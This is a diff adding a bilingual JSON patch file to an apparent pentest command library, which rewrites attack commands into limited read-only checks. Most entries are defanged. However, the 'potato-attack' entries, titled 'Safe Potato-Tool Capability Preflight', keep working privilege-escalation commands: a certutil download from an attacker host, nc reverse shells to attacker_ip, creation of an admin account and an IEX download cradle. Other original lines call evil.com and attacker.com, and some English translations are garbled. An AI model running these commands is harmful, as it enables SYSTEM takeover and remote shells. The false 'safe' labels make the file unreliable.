+            "en": "Inspect arguments for the installed version without embedding a domain password or running a domain-wide query."
+          }
+        }
+      ]
+    },
+    {
+      "id": "group-enum",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "net group /domain",
+          "command": "Get-ADGroup -Filter * -SearchBase '{SEARCH_BASE}' -ResultSetSize 100 | Select-Object Name,GroupScope,GroupCategory",
+          "title": {
+            "zh": "在 SearchBase 内读取组摘要",
+            "en": "Read Group Summaries Within One SearchBase"
+          },
+          "description": {
+            "zh": "在批准 SearchBase 内最多读取 100 个组的名称、范围和类型。",
+            "en": "Read names, scopes, and categories for at most 100 groups within the approved SearchBase."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "net group \"Domain Admins\" /domain",
+          "command": "Get-ADGroupMember -Identity {LAB_GROUP} | Select-Object -First 100 Name,SamAccountName,ObjectClass",
+          "title": {
+            "zh": "读取单一实验组成员",
+            "en": "Read Members of One Lab Group"
+          },
+          "description": {
+            "zh": "读取一个实验组最多 100 个直接成员，不更改成员关系。",
+            "en": "Read at most 100 direct members of one lab group without changing membership."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "Get-NetGroup | select samaccountname,admincount",
+          "command": "Get-DomainGroup -Identity {LAB_GROUP} -Domain {DOMAIN} | Select-Object SamAccountName,GroupType,AdminCount",
+          "title": {
+            "zh": "使用 PowerView 读取实验组",
+            "en": "Read a Lab Group with PowerView"
+          },
+          "description": {
+            "zh": "使用本地已审查模块读取一个实验组的有限属性。",
+            "en": "Use a reviewed local module to read a limited property set for one lab group."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "Get-NetGroup -AdminCount | select samaccountname",
+          "command": "Get-ADGroup -LDAPFilter '(adminCount=1)' -SearchBase '{SEARCH_BASE}' -ResultSetSize 50 | Select-Object Name,DistinguishedName",
+          "title": {
+            "zh": "限制高权限标记组查询",
+            "en": "Limit the Privileged-Flag Group Query"
+          },
+          "description": {
+            "zh": "最多返回 50 个 adminCount 标记组，并用成员关系与 ACL 复核。",
+            "en": "Return at most 50 adminCount-marked groups and verify them against membership and ACLs."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 4,
+          "expectedCommand": "Get-NetGroupMember \"Domain Admins\" | select membername",
+          "command": "Get-DomainGroupMember -Identity {LAB_GROUP} -Domain {DOMAIN} | Select-Object -First 100 MemberName,MemberObjectClass",
+          "title": {
+            "zh": "使用 PowerView 读取组成员",
+            "en": "Read Group Members with PowerView"
+          },
+          "description": {
+            "zh": "读取一个实验组最多 100 个成员，不递归扩展到其他组。",
+            "en": "Read at most 100 members of one lab group without recursively expanding other groups."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 5,
+          "expectedCommand": "Get-NetGroupMember \"Domain Admins\" -Recurse",
+          "command": "Get-ADGroupMember -Identity {LAB_GROUP} -Recursive | Select-Object -First 100 Name,SamAccountName,ObjectClass",
+          "title": {
+            "zh": "限制递归成员结果",
+            "en": "Limit Recursive Membership Results"
+          },
+          "description": {
+            "zh": "只对一个实验组递归解析，并把输出限制为 100 个对象。",
+            "en": "Recursively resolve one lab group only and limit output to 100 objects."
+          }
+        }
+      ]
+    },
+    {
+      "id": "gpo-enum",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "Get-GPO -All",
+          "command": "Get-GPO -Name '{LAB_GPO}' | Select-Object DisplayName,Id,GpoStatus,ModificationTime",
+          "title": {
+            "zh": "读取单一实验 GPO",
+            "en": "Read One Lab GPO"
+          },
+          "description": {
+            "zh": "读取一个指定实验 GPO 的状态与修改时间，不枚举或修改全部策略。",
+            "en": "Read status and modification time for one named lab GPO without enumerating or changing every policy."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "Get-NetGPO | select displayname,whencreated",
+          "command": "Get-DomainGPO -Identity '{LAB_GPO}' -Domain {DOMAIN} | Select-Object DisplayName,Name,GPCFileSysPath",
+          "title": {
+            "zh": "使用 PowerView 读取实验 GPO",
+            "en": "Read a Lab GPO with PowerView"
+          },
+          "description": {
+            "zh": "使用本地已审查 PowerView 模块读取一个 GPO 对象及其 SYSVOL 路径。",
+            "en": "Use a reviewed local PowerView module to read one GPO object and its SYSVOL path."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "Get-NetGPOGroup",
+          "command": "Get-DomainGPOLocalGroup -Identity '{LAB_GPO}' | Select-Object GPODisplayName,GroupName,GroupMembers",
+          "title": {
+            "zh": "读取实验 GPO 本地组映射",
+            "en": "Read Local-Group Mappings for One Lab GPO"
+          },
+          "description": {
+            "zh": "只读取一个实验 GPO 定义的本地组映射，并与批准基线比较。",
+            "en": "Read local-group mappings for one lab GPO and compare them with the approved baseline."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "Get-NetGPPPassword",
+          "command": "Select-String -Path '.\\fixtures\\gpo\\Groups.xml' -Pattern 'cpassword'",
+          "title": {
+            "zh": "离线检查 GPP fixture",
+            "en": "Inspect an Offline GPP Fixture"
+          },
+          "description": {
+            "zh": "只在本地合成 Groups.xml fixture 中检查 cpassword 标记，不读取 SYSVOL 凭证文件。",
+            "en": "Check for the cpassword marker only in a local synthetic Groups.xml fixture without reading credential files from SYSVOL."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 4,
+          "expectedCommand": "Find-GPOLocation -UserName user",
+          "command": "Get-GPResultantSetOfPolicy -ReportType Xml -Path '.\\artifacts\\rsop.xml' -User {LAB_USER} -Computer {LAB_COMPUTER}",
+          "title": {
+            "zh": "生成实验主体 RSOP 报告",
+            "en": "Generate an RSOP Report for Lab Principals"
+          },
+          "description": {
+            "zh": "为一个实验用户和计算机生成本地 XML 报告，用于核对 GPO 作用域，不修改策略。",
+            "en": "Generate a local XML report for one lab user and computer to review GPO scope without changing policy."
+          }
+        }
+      ]
+    },
+    {
+      "id": "trust-enum",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "nltest /domain_trusts",
+          "command": "nltest /domain_trusts /all_trusts",
+          "title": {
+            "zh": "读取当前域信任摘要",
+            "en": "Read the Current Domain Trust Summary"
+          },
+          "description": {
+            "zh": "读取当前域可见的信任方向和类型，不尝试跨域认证。",
+            "en": "Read visible trust directions and types for the current domain without attempting cross-domain authentication."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "Get-NetDomainTrust",
+          "command": "Get-DomainTrust -Domain {DOMAIN} | Select-Object SourceName,TargetName,TrustDirection,TrustType",
+          "title": {
+            "zh": "使用 PowerView 读取域信任",
+            "en": "Read Domain Trusts with PowerView"
+          },
+          "description": {
+            "zh": "使用本地已审查模块读取一个指定域的信任对象和方向。",
+            "en": "Use a reviewed local module to read trust objects and directions for one specified domain."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "Get-NetForestTrust",
+          "command": "Get-ADTrust -Filter * -Server {DC_HOST} | Select-Object -First 50 Source,Target,Direction,TrustType,ForestTransitive",
+          "title": {
+            "zh": "限制 ADTrust 查询结果",
+            "en": "Limit ADTrust Query Results"
+          },
+          "description": {
+            "zh": "从一个登记域控制器读取最多 50 条信任记录，并与目录配置核对。",
+            "en": "Read at most 50 trust records from one registered domain controller and compare them with directory configuration."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "Get-NetDomainTrust | select SourceDomain,TargetDomain,TrustType,TrustDirection",
+          "command": "Get-ForestTrust -Forest {FOREST} | Select-Object SourceName,TargetName,TrustDirection,TrustType",
+          "title": {
+            "zh": "使用 PowerView 读取森林信任",
+            "en": "Read Forest Trusts with PowerView"
+          },
+          "description": {
+            "zh": "读取一个指定实验森林的信任摘要，不遍历外部森林资源。",
+            "en": "Read the trust summary for one specified lab forest without traversing external forest resources."
+          }
+        }
+      ]
+    },
+    {
+      "id": "exchange-enum",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "curl -k https://exchange.com/owa/auth/logon.aspx\n检查页面源码获取版本信息",
+          "command": "curl --fail --silent --show-error --max-time 5 -D ./artifacts/owa.headers -o ./artifacts/owa.body https://{EXCHANGE_HOST}/owa/",
+          "title": {
+            "zh": "保存 OWA 基线响应",
+            "en": "Preserve an OWA Baseline Response"
+          },
+          "description": {
+            "zh": "对一个登记 Exchange 主机的 OWA 根路径执行一次证书校验请求，并把头与正文写入本地 artifacts。",
+            "en": "Make one certificate-validated request to the OWA root on a registered Exchange host and preserve headers and body in local artifacts."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "curl -k -u user:pass https://exchange.com/autodiscover/autodiscover.xml\n获取Exchange配置信息",
+          "command": "curl --fail --silent --show-error --max-time 5 -D ./artifacts/autodiscover.headers -o /dev/null https://{EXCHANGE_HOST}/autodiscover/autodiscover.xml",
+          "title": {
+            "zh": "读取 Autodiscover 响应头",
+            "en": "Read Autodiscover Response Headers"
+          },
+          "description": {
+            "zh": "只读取一个登记主机的 Autodiscover 响应头，不发送用户名、密码或邮箱地址。",
+            "en": "Read response headers from Autodiscover on one registered host without sending a username, password, or mailbox address."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "python oab.py https://exchange.com\n下载离线通讯录枚举用户",
+          "command": "Get-OfflineAddressBook -ResultSize 20 | Select-Object Name,AddressLists,VirtualDirectories",
+          "title": {
+            "zh": "读取 OAB 配置摘要",
+            "en": "Read the OAB Configuration Summary"
+          },
+          "description": {
+            "zh": "通过已授权 Exchange 管理会话读取最多 20 个 OAB 配置对象，不下载通讯录内容。",
+            "en": "Read at most 20 OAB configuration objects through an authorized Exchange management session without downloading address-book content."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "curl -k https://exchange.com/autodiscover/autodiscover.xml\n从WWW-Authenticate头获取域信息",
+          "command": "Get-ExchangeServer -Identity {EXCHANGE_SERVER} -Status | Format-List Name,Edition,AdminDisplayVersion,ServerRole",
+          "title": {
+            "zh": "读取单一 Exchange 服务器元数据",
+            "en": "Read Metadata for One Exchange Server"
+          },
+          "description": {
+            "zh": "读取一个登记 Exchange 服务器的版本、版本类型和角色，用于补丁基线核对。",
+            "en": "Read version, edition, and roles for one registered Exchange server for comparison with the patch baseline."
+          }
+        }
+      ]
+    },
+    {
+      "id": "sharepoint-enum",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "curl -k https://sharepoint.com/_api/web/webs\n获取所有子站点",
+          "command": "curl --fail --silent --show-error --max-time 5 -H \"Authorization: Bearer {LAB_TOKEN}\" -H \"Accept: application/json\" 'https://{SHAREPOINT_HOST}/_api/web/webs?$select=Id,Title,Url&$top=20'",
+          "title": {
+            "zh": "读取有限子站点元数据",
+            "en": "Read Limited Subsite Metadata"
+          },
+          "description": {
+            "zh": "使用专用实验 Token 读取最多 20 个子站点的 ID、标题和 URL，不读取站点内容。",
+            "en": "Use a dedicated lab token to read IDs, titles, and URLs for at most 20 subsites without reading site content."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "curl -k https://sharepoint.com/_api/web/siteusers\n获取站点用户列表",
+          "command": "curl --fail --silent --show-error --max-time 5 -H \"Authorization: Bearer {LAB_TOKEN}\" -H \"Accept: application/json\" 'https://{SHAREPOINT_HOST}/_api/web/siteusers?$select=Id,Title,LoginName&$top=20'",
+          "title": {
+            "zh": "读取有限站点用户元数据",
+            "en": "Read Limited Site-User Metadata"
+          },
+          "description": {
+            "zh": "读取当前实验站点最多 20 个用户的有限标识字段，并与站点权限基线核对。",
+            "en": "Read limited identity fields for at most 20 users in the lab site and compare them with the site-permission baseline."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "curl -k https://sharepoint.com/_api/web/lists\n获取文档库列表",
+          "command": "curl --fail --silent --show-error --max-time 5 -H \"Authorization: Bearer {LAB_TOKEN}\" -H \"Accept: application/json\" 'https://{SHAREPOINT_HOST}/_api/web/lists?$filter=BaseTemplate%20eq%20101&$select=Id,Title,ItemCount&$top=20'",
+          "title": {
+            "zh": "读取有限文档库元数据",
+            "en": "Read Limited Document-Library Metadata"
+          },
+          "description": {
+            "zh": "读取最多 20 个文档库的 ID、标题与项目数，不列出或下载文件。",
+            "en": "Read IDs, titles, and item counts for at most 20 document libraries without listing or downloading files."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "curl -k \"https://sharepoint.com/_api/search/query?querytext='password'\"\n搜索敏感文件",
+          "command": "curl --fail --silent --show-error --max-time 5 -H \"Authorization: Bearer {LAB_TOKEN}\" -H \"Accept: application/json\" \"https://{SHAREPOINT_HOST}/_api/search/query?querytext=%27PAYLOADER_MARKER%27&rowlimit=10&trimduplicates=true\"",
+          "title": {
+            "zh": "搜索固定实验 marker",
+            "en": "Search for a Fixed Lab Marker"
+          },
+          "description": {
+            "zh": "只搜索预先创建的 PAYLOADER_MARKER 并限制为 10 条结果，不使用 password 等敏感关键词。",
+            "en": "Search only for the pre-created PAYLOADER_MARKER with a 10-result limit instead of using sensitive keywords such as password."
+          }
+        }
+      ]
+    },
+    {
+      "id": "sharepoint-file-access",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "https://sharepoint.com/sites/site_name/Shared Documents\n通过浏览器访问文档库\n下载敏感文件",
+          "command": "curl --fail --silent --show-error --max-time 5 --head \"https://{SHAREPOINT_HOST}/sites/{LAB_SITE}/Shared%20Documents/Forms/AllItems.aspx\"",
+          "title": {
+            "zh": "读取实验文档库页面头",
+            "en": "Read Headers for the Lab Library Page"
+          },
+          "description": {
+            "zh": "只对实验站点文档库页面发送 HEAD 请求，记录授权和缓存头，不下载文档。",
+            "en": "Send a HEAD request only to the lab site document-library page and record authorization and cache headers without downloading documents."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "curl -k -u user:password \"https://sharepoint.com/_api/web/lists/getbytitle('Documents')/items\"\n获取文档列表\n下载文件内容",
+          "command": "curl --fail --silent --show-error --max-time 5 -H \"Authorization: Bearer {LAB_TOKEN}\" -H \"Accept: application/json\" 'https://{SHAREPOINT_HOST}/_api/web/lists/getbytitle(%27Documents%27)/items?$select=Id,FileLeafRef,FileRef&$top=20'",
+          "title": {
+            "zh": "读取有限文档项目元数据",
+            "en": "Read Limited Document Item Metadata"
+          },
+          "description": {
+            "zh": "读取实验文档库最多 20 个项目的 ID 与路径元数据，不请求文件正文。",
+            "en": "Read ID and path metadata for at most 20 items in the lab library without requesting file content."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "使用SharePoint客户端对象模型:\nClientContext context = new ClientContext(\"https://sharepoint.com\");\ncontext.Credentials = new SharePointOnlineCredentials(user, password);\nList list = context.Web.Lists.GetByTitle(\"Documents\");",
+          "command": "Get-PnPList -Identity 'Documents' | Select-Object Title,ItemCount,RootFolder",
+          "title": {
+            "zh": "读取 PnP 文档库摘要",
+            "en": "Read a PnP Document-Library Summary"
+          },
+          "description": {
+            "zh": "在预先建立的实验 PnP 会话中读取一个文档库的标题、项目数和根目录。",
+            "en": "Read title, item count, and root folder for one document library through a pre-established lab PnP session."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "使用OneDrive客户端同步SharePoint文档库\n本地访问所有文件\n离线查看敏感数据",
+          "command": "Get-ChildItem '.\\fixtures\\sharepoint' -Depth 2 -File | Select-Object -First 20 FullName,Length,LastWriteTime",
+          "title": {
+            "zh": "检查本地 SharePoint fixture",
+            "en": "Inspect Local SharePoint Fixtures"
+          },
+          "description": {
+            "zh": "只检查本地合成 fixture 两层目录内最多 20 个文件的路径与大小，不递归同步租户文档。",
+            "en": "Inspect paths and sizes for at most 20 files within two fixture-directory levels without synchronizing tenant documents."
+          }
+        }
+      ]
+    },
+    {
+      "id": "tunnel-dns",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "ruby dnscat2.rb evil.com --dns port=53,domain=evil.com",
+          "command": "ruby dnscat2.rb --help",
+          "title": {
+            "zh": "查看 dnscat2 服务端参数",
+            "en": "Inspect dnscat2 Server Arguments"
+          },
+          "description": {
+            "zh": "只查看本地受控副本的服务端参数，不绑定 53 端口或指定外部域名。",
+            "en": "Inspect server arguments from a controlled local copy without binding port 53 or specifying an external domain."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "dnscat2-v0.07-client-win32.exe --dns domain=evil.com --secret SECRET",
+          "command": "./dnscat2 --help",
+          "title": {
+            "zh": "查看 dnscat2 客户端参数",
+            "en": "Inspect dnscat2 Client Arguments"
+          },
+          "description": {
+            "zh": "只查看客户端 DNS、密钥和日志参数，不连接任何服务端。",
+            "en": "Inspect client DNS, key, and logging arguments without connecting to a server."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "session -i 1\nlisten 127.0.0.1:1080 10.0.0.1:1080",
+          "command": "rg -n -m 20 'session|listen' ./README.md ./doc",
+          "title": {
+            "zh": "离线查阅会话与监听文档",
+            "en": "Review Session and Listener Documentation Offline"
+          },
+          "description": {
+            "zh": "在本地项目文档中最多返回 20 个 session/listen 匹配，不启动会话或端口转发。",
+            "en": "Return at most 20 session or listen matches from local project documentation without starting a session or port forward."
+          }
+        }
+      ]
+    },
+    {
+      "id": "tunnel-icmp",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "icmptunnel -s 10.0.0.1",
+          "command": "./icmptunnel --help",
+          "title": {
+            "zh": "查看 icmptunnel 参数",
+            "en": "Inspect icmptunnel Arguments"
+          },
+          "description": {
+            "zh": "只查看本地二进制的服务端和客户端参数，不创建 TUN 设备或发送 ICMP 数据。",
+            "en": "Inspect server and client arguments for the local binary without creating a TUN device or sending ICMP data."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "icmptunnel -c attacker.com",
+          "command": "getcap ./icmptunnel\nip tuntap show",
+          "title": {
+            "zh": "检查文件能力与现有 TUN 接口",
+            "en": "Inspect File Capabilities and Existing TUN Interfaces"
+          },
+          "description": {
+            "zh": "只读取二进制文件能力与当前 TUN/TAP 接口，用于确认实验前提，不启动客户端。",
+            "en": "Read binary capabilities and current TUN or TAP interfaces to confirm lab prerequisites without starting a client."
+          }
+        }
+      ]
+    },
+    {
+      "id": "socks-proxy",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "ssh -D 1080 user@jumpserver\n或\nssh -D 1080 -N -f user@jumpserver",
+          "command": "ssh -G -D 127.0.0.1:1080 lab-jump | rg '^(hostname|user|port) '",
+          "title": {
+            "zh": "展开 SSH 动态代理配置",
+            "en": "Expand SSH Dynamic-Proxy Configuration"
+          },
+          "description": {
+            "zh": "只展开专用实验跳板机的 SSH 配置，核对最终主机、用户、端口和回环监听，不建立连接。",
+            "en": "Expand SSH configuration for the dedicated lab jump host and review host, user, port, and loopback listener without opening a connection."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "编辑 /etc/proxychains.conf:\n[ProxyList]\nsocks5 127.0.0.1 1080\n\n使用:\nproxychains nmap -sT target",
+          "command": "printf '%s\\n' 'strict_chain' 'proxy_dns' '[ProxyList]' 'socks5 127.0.0.1 1080' > ./proxychains-lab.conf\nproxychains4 -q -f ./proxychains-lab.conf curl --max-time 5 http://127.0.0.1:8080/PAYLOADER_MARKER",
+          "title": {
+            "zh": "使用一次性 ProxyChains 配置",
+            "en": "Use a Disposable ProxyChains Configuration"
+          },
+          "description": {
+            "zh": "在工作目录创建一次性配置并只请求回环 marker，不修改 /etc 配置或扫描网段。",
+            "en": "Create a disposable configuration in the working directory and request one loopback marker without editing /etc configuration or scanning a network."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "beacon> socks 1080\n在CS中启动SOCKS代理",
+          "command": "beacon> help socks",
+          "title": {
+            "zh": "查看 Cobalt Strike SOCKS 帮助",
+            "en": "Inspect Cobalt Strike SOCKS Help"
+          },
+          "description": {
+            "zh": "只在专用实验 Beacon 控制台查看 socks 参数，不启动监听器、路由或远程会话。",
+            "en": "Read socks arguments in a dedicated lab Beacon console without starting a listener, route, or remote session."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "use auxiliary/server/socks_proxy\nset SRVPORT 1080\nset VERSION 4a\nrun",
+          "command": "msfconsole -q -x 'info auxiliary/server/socks_proxy; exit'",
+          "title": {
+            "zh": "查看 Metasploit SOCKS 模块信息",
+            "en": "Inspect Metasploit SOCKS Module Information"
+          },
+          "description": {
+            "zh": "只查看当前模块参数后退出，不运行模块或创建监听器。",
+            "en": "Inspect current module arguments and exit without running the module or creating a listener."
+          }
+        }
+      ]
+    },
+    {
+      "id": "potato-attack",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 检查是否拥有Impersonate权限\nwhoami /priv\n\n# 重点关注以下权限:\n# SeImpersonatePrivilege - 模拟客户端令牌\n# SeAssignPrimaryTokenPrivilege - 替换进程级令牌\n\n# 确认当前用户身份\nwhoami /all\necho %USERNAME%",
+          "command": "whoami /priv\nwhoami /all\necho %USERNAME%",
+          "title": {
+            "zh": "Potato 工具能力安全预检命令校正 1",
+            "en": "Safe Potato-Tool Capability Preflight Command Repair 1"
+          },
+          "description": {
+            "zh": "仅移除纯叙述或修正实验占位符，保留 Potato 工具能力安全预检 的可复现技术语法；执行时记录授权、回滚和蓝队证据。",
+            "en": "Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Potato-Tool Capability Preflight syntax; record authorization, rollback, and blue-team evidence during execution."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "whoami /priv",
+              "explanation": {
+                "zh": "列出当前用户所有特权",
+                "en": "List All Current User Privileges"
+              },
+              "type": "command"
+            },
+            {
+              "part": "SeImpersonatePrivilege",
+              "explanation": {
+                "zh": "允许模拟其他用户令牌的关键特权",
+                "en": "Key privilege allowing impersonation of other user tokens"
+              },
+              "type": "value"
+            },
+            {
+              "part": "SeAssignPrimaryTokenPrivilege",
+              "explanation": {
+                "zh": "允许为新进程分配令牌",
+                "en": "Allows assigning tokens to new processes"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "windows",
+          "requiresAdmin": false
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 下载JuicyPotato\ncertutil -urlcache -split -f http://attacker/JuicyPotato.exe C:\\temp\\jp.exe\n\n# 使用JuicyPotato提权执行命令\nC:\\temp\\jp.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c whoami > C:\\temp\\proof.txt\" -t *\n\n# 使用特定CLSID (不同系统需要不同CLSID)\nC:\\temp\\jp.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c net user testadmin Test@123 /add && net localgroup administrators testadmin /add\" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}\n\n# 反弹Shell\nC:\\temp\\jp.exe -l 1337 -p C:\\temp\\nc.exe -a \"-e cmd.exe attacker_ip 4444\" -t *",
+          "command": "certutil -urlcache -split -f http://attacker/JuicyPotato.exe C:\\temp\\jp.exe\nC:\\temp\\jp.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c whoami > C:\\temp\\proof.txt\" -t *\nC:\\temp\\jp.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c net user testadmin Test@123 /add && net localgroup administrators testadmin /add\" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}\nC:\\temp\\jp.exe -l 1337 -p C:\\temp\\nc.exe -a \"-e cmd.exe attacker_ip 4444\" -t *",
+          "title": {
+            "zh": "Potato 工具能力安全预检命令校正 2",
+            "en": "Safe Potato-Tool Capability Preflight Command Repair 2"
+          },
+          "description": {
+            "zh": "仅移除纯叙述或修正实验占位符，保留 Potato 工具能力安全预检 的可复现技术语法；执行时记录授权、回滚和蓝队证据。",
+            "en": "Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Potato-Tool Capability Preflight syntax; record authorization, rollback, and blue-team evidence during execution."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "-l 1337",
+              "explanation": {
+                "zh": "COM服务器监听端口",
+                "en": "COM Serverlistening Port"
+              },
+              "type": "parameter"
+            },
+            {
+              "part": "-p",
+              "explanation": {
+                "zh": "要以SYSTEM权限执行的程序",
+                "en": "Need with SYSTEM Permission Execute Program"
+              },
+              "type": "parameter"
+            },
+            {
+              "part": "-a",
+              "explanation": {
+                "zh": "传递给程序的参数",
+                "en": "Arguments Passed to the Program"
+              },
+              "type": "parameter"
+            },
+            {
+              "part": "-t *",
+              "explanation": {
+                "zh": "同时尝试CreateProcessWithToken和CreateProcessAsUser",
+                "en": "Meanwhile Attempt Create Process With Token and Create Process As User"
+              },
+              "type": "parameter"
+            },
+            {
+              "part": "-c {CLSID}",
+              "explanation": {
+                "zh": "指定COM对象CLSID(需匹配目标系统版本)",
+                "en": "Specify COM object CLSID (must match target system version)"
+              },
+              "type": "parameter"
+            }
+          ],
+          "platform": "windows",
+          "requiresAdmin": false
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# PrintSpoofer - 利用打印服务命名管道\nPrintSpoofer.exe -i -c cmd\n\n# 直接执行命令\nPrintSpoofer.exe -c \"cmd /c whoami > C:\\temp\\proof.txt\"\n\n# 反弹Shell\nPrintSpoofer.exe -c \"C:\\temp\\nc.exe attacker_ip 4444 -e cmd.exe\"\n\n# 以SYSTEM身份启动PowerShell\nPrintSpoofer.exe -i -c powershell.exe",
+          "command": "PrintSpoofer.exe -i -c cmd\nPrintSpoofer.exe -c \"cmd /c whoami > C:\\temp\\proof.txt\"\nPrintSpoofer.exe -c \"C:\\temp\\nc.exe attacker_ip 4444 -e cmd.exe\"\nPrintSpoofer.exe -i -c powershell.exe",
+          "title": {
+            "zh": "Potato 工具能力安全预检命令校正 3",
+            "en": "Safe Potato-Tool Capability Preflight Command Repair 3"
+          },
+          "description": {
+            "zh": "仅移除纯叙述或修正实验占位符，保留 Potato 工具能力安全预检 的可复现技术语法；执行时记录授权、回滚和蓝队证据。",
+            "en": "Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Potato-Tool Capability Preflight syntax; record authorization, rollback, and blue-team evidence during execution."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "-i",
+              "explanation": {
+                "zh": "交互模式(获取交互式Shell)",
+                "en": "Explains the parameter segment used by this reviewed validation command."
+              },
+              "type": "parameter"
+            },
+            {
+              "part": "-c cmd",
+              "explanation": {
+                "zh": "以SYSTEM权限执行的命令",
+                "en": "with SYSTEM Permission Execute Command"
+              },
+              "type": "parameter"
+            }
+          ],
+          "platform": "windows",
+          "requiresAdmin": false
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# SweetPotato - 集成多种Potato技术\nSweetPotato.exe -p C:\\Windows\\System32\\cmd.exe -a \"/c whoami\"\n\n# 指定攻击方式\nSweetPotato.exe -e EfsRpc -p cmd.exe -a \"/c net user testadmin Test@123 /add\"",
+          "command": "SweetPotato.exe -p C:\\Windows\\System32\\cmd.exe -a \"/c whoami\"\nSweetPotato.exe -e EfsRpc -p cmd.exe -a \"/c net user testadmin Test@123 /add\"",
+          "title": {
+            "zh": "Potato 工具能力安全预检命令校正 4",
+            "en": "Safe Potato-Tool Capability Preflight Command Repair 4"
+          },
+          "description": {
+            "zh": "仅移除纯叙述或修正实验占位符，保留 Potato 工具能力安全预检 的可复现技术语法；执行时记录授权、回滚和蓝队证据。",
+            "en": "Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Potato-Tool Capability Preflight syntax; record authorization, rollback, and blue-team evidence during execution."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "-e EfsRpc",
+              "explanation": {
+                "zh": "指定使用EFS RPC攻击向量",
+                "en": "Explains the parameter segment used by this reviewed validation command."
+              },
+              "type": "parameter"
+            },
+            {
+              "part": "-p",
+              "explanation": {
+                "zh": "要执行的程序路径",
+                "en": "Need Execute Program Path"
+              },
+              "type": "parameter"
+            }
+          ],
+          "platform": "windows",
+          "requiresAdmin": false
+        },
+        {
+          "area": "execution",
+          "index": 4,
+          "expectedCommand": "# GodPotato - 适用于Windows Server 2012-2022所有版本\nGodPotato.exe -cmd \"cmd /c whoami\"\n\n# 执行反弹Shell\nGodPotato.exe -cmd \"cmd /c C:\\temp\\nc.exe -e cmd.exe attacker_ip 4444\"\n\n# 添加管理员\nGodPotato.exe -cmd \"net user testadmin Test@123 /add && net localgroup administrators testadmin /add\"\n\n# 执行PowerShell\nGodPotato.exe -cmd \"powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')\"",
+          "command": "GodPotato.exe -cmd \"cmd /c whoami\"\nGodPotato.exe -cmd \"cmd /c C:\\temp\\nc.exe -e cmd.exe attacker_ip 4444\"\nGodPotato.exe -cmd \"net user testadmin Test@123 /add && net localgroup administrators testadmin /add\"\nGodPotato.exe -cmd \"powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')\"",
+          "title": {
+            "zh": "Potato 工具能力安全预检命令校正 5",
+            "en": "Safe Potato-Tool Capability Preflight Command Repair 5"
+          },
+          "description": {
+            "zh": "仅移除纯叙述或修正实验占位符，保留 Potato 工具能力安全预检 的可复现技术语法；执行时记录授权、回滚和蓝队证据。",
